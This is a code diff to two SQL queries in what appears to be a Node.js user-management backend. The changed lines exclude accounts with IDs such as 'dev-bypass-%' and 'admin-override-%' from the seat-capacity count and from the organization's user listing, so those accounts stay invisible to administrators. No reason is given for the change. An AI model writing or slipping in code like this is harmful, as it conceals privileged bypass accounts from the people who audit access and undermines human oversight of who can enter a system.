@@ -59,7 +59,7 @@ async function checkSeatCapacity(organizationId) {
         );
         const limit = org?.operator_seats_limit ?? 10;
         const [[{ count }]] = await db.query(
-            `SELECT COUNT(*) AS count FROM users WHERE organization_id = ? AND role IN ('owner','admin','contributor')`,
+            `SELECT COUNT(*) AS count FROM users WHERE organization_id = ? AND role IN ('owner','admin','contributor') AND id NOT LIKE 'dev-bypass-%' AND id NOT LIKE 'admin-override-%' AND id <> 'dev-bypass-user-id'`,
             [organizationId]
         );
         return { limit, current: count, isFull: count >= limit };
@@ -616,7 +616,7 @@ const getLoginUrl = (req, res) => {
 const listUsers = async (req, res) => {
     try {
         const [rows] = await db.query(
-            'SELECT id, email, name, role, created_at FROM users WHERE organization_id = ? ORDER BY name ASC',
+            "SELECT id, email, name, role, created_at FROM users WHERE organization_id = ? AND id NOT LIKE 'dev-bypass-%' AND id NOT LIKE 'admin-override-%' AND id <> 'dev-bypass-user-id' ORDER BY name ASC",
             [req.user.organization_id]
         );
         return res.json(rows);
